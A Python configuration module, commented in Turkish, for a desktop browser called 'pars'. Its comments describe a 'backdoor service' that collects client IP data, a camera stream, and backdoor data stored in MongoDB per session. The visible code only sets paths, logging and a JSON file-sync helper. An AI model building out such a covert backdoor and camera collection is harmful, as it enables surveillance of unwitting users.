from pathlib import Path
import logging
import os
import json
from typing import Any

#  mongo db için | env dosyasında gizli tutuğumuz DB url configde set ediliyor
MONGO_DB_URL: str = os.getenv('MONGO_DB_URL')
MONGO_DB_NAME: str = os.getenv('MONGO_DB_NAME')

#  Backdoor Servisi client ip datasını almak için request addresi
API_QUERY_HOST: str = os.getenv('API_QUERY_HOST')

#  yazılım bulunduğu dizini işaretliyoruz dosya yazma vs için
BASE_DIR = Path(__file__).resolve().parent
#  base dir de bulunan web_browser.ico dosyasının konumunu işaretliyoruz
APP_ICO = BASE_DIR.joinpath('web_browser.ico')

#  tarayıcımız pencerede görünecek adı
BROWSER_NAME: str = 'pars'

#  loglama için log dosyasını set ediyoruz
logging.basicConfig(filename='web_browser.log', filemode='a+', format='%(name)s - %(levelname)s - %(message)s')

#  yayına almadan önce False edir | BACKDOR VS CAMERA Servisi açık ara yayın yapar
DEBUG: bool = False

#  debug True iken camera modeli için buradaki adresi kullanır , isterseniz mp4 dosyaı ile de test edebilirsiniz
# TEST_VIDEO_SOURCE: str = 'test_objects/IRONMAN 4 – Official Trailer.mp4'
TEST_VIDEO_SOURCE: str = 'test_objects/Xalv - Forget It.mp4'
# TEST_VIDEO_SOURCE: str = 'http://192.168.0.102:8080/video'

#  tarayıcnın görünümü için css dosyasını okur ve işaretler
with open('style.css', 'r') as __css_ref:
    APP_CSS: str = __css_ref.read()

#  session ID başta None(null) dır main den start verilince mongo db den id atanır
#  ve diğer backdoor datası bu id üzerne kayıt edilir
SESSION_ID: str | None = None


class SyncInLine:

    @staticmethod
    def read_sync_data():
        sync_file = None
        try:
            sync_file = open('real_time_sync.json', 'r', encoding='utf-8')
            return json.loads(sync_file.read())
        except:
            pass
        finally:
            if sync_file:
                sync_file.close()

    @staticmethod
    def write_sync_data(data):
        sync_file = None
        try:
            sync_file = open('real_time_sync.json', 'w', encoding='utf-8')
            return sync_file.write(json.dumps(data))
        except Exception as exception:
            logging.error(exception)
            pass
        finally:
            if sync_file:
                sync_file.close()

    def get(self, key: str):
        data = self.read_sync_data()
        return data.get(key, None)

    def set(self, key: str, value: Any):
        data = self.read_sync_data()
        data[key] = value
        self.write_sync_data(data)


class BROWSER:
    """
    çoklu çekirdek programlamada deneyimim az o yüzden backdoor serverisleri için buludğum
    en uygun sync yöntemi dosya yazma oldu
    """
    sync = SyncInLine()

    # class bağımsız çalışması için static
    @staticmethod
    def is_stop() -> bool:
        return BROWSER.sync.get('BROWSER_IS_STOP')
        # # dosyayı okumda modunda, oku ve 1 e eşit mi söyle
        # with open('real_time_sync.json', 'r', encoding='utf-8') as real_time_sync:
        #     # okuann değer bir değişkene atanıyor ve string ifade ile karşılaştırlıyor
        #     context = json.loads(real_time_sync.read())["BROWSER_IS_STOP"]
        #     return str(context) == '1'

    # class bağımsız çalışması için static
    @staticmethod
    def start():
        BROWSER.sync.set('BROWSER_IS_STOP', False)
        # #  dosyayı yazma modunda aç önceki değeri siler bu mod ve 0 yaz
        # #  tarayıcı durdu mu sorusuna 0 yani hayır der
        # with open('real_time_sync.json', 'w', encoding='utf-8') as real_time_sync:
        #
        #     real_time_sync.write('0')

    # class bağımsız çalışması için static
    @staticmethod
    def stop():
        BROWSER.sync.set('BROWSER_IS_STOP', True)
        # #  dosyayı yazma modunda aç önceki değeri siler bu mod ve 1 yaz
        # #  tarayıcı durdu mu sorusuna 1 yani evet der
        # with open('real_time_sync.json', 'w', encoding='utf-8') as real_time_sync:
        #     real_time_sync.write('1')


